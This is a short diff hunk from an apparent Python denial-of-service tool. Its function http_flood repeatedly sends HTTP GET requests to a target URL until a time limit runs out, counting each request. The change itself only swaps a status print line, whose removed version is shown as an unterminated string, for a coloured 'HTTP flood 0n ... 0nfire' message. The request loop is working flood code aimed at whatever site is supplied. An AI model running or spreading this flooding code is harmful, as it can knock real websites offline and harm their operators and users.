@@ -168,7 +168,7 @@ def http_flood(url, duration):
     try:
         while time.time() < end_time:
             requests.get(url, timeout=1)
-            print("
+            print("\033[48;5;4m HTTP flood 0n \033[0m \033[32m" +str(url)+ "\033[7m 0nfire\033[0m")
             request_count += 1
     except Exception as e:
         print(Fore.LIGHTRED_EX + f"[!] Error during HTTP flood: {e}")
